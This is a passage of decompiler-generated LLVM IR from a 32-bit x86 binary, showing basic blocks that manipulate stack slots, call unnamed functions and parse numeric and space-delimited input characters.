  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_8050089(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_805021e()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_804fb51(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_804f660()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp240, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp241, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052490.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8052490.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
  %v4_80499ab = call i32 @function_804f8a0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
